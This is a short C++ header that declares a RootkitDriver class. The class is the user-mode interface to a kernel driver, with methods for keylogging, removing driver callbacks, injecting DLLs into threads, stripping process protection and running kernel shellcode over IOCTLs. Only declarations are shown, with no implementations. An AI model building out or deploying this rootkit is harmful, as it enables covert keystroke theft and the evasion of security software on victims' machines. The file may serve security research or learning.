#pragma once

#include "pch.h"

#include <string>

#include "../MarkDriver/Common.h"
// yeah, ugly, but it's better than copying right? right..?
// if it were 2+ files I would have created a sep project but I think even pavel would forgive me here
#include "../DriverLoader/AutoHandle.h"

class RootkitDriver {
public:
	RootkitDriver();

	VOID StartKeyloggging();

	VOID GetKeyloggingData(std::string& KeyData, ULONG BufferSize = 2048);

	VOID EndKeylogging();

	VOID RemoveDriverCallbacks(char ImageName[16]);

	VOID InjectLibraryToThread(HANDLE Tid, const CHAR* DllPath);

	VOID RemoveProtectionFromProcess(ULONG Pid);

	VOID RestoreProtectionToProcess(ULONG Pid);

	DWORD RunKmShellcode(KM_SHELLCODE_ROUTINE Shellcode, size_t ShellcodeSize, const PVOID Input, size_t InputLength,
		PVOID Output, ULONG OutputSize);

private:
	DWORD SendIoctl(ULONG Ioctl, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);

private:
	Utils::AutoHandle deviceHandle;
};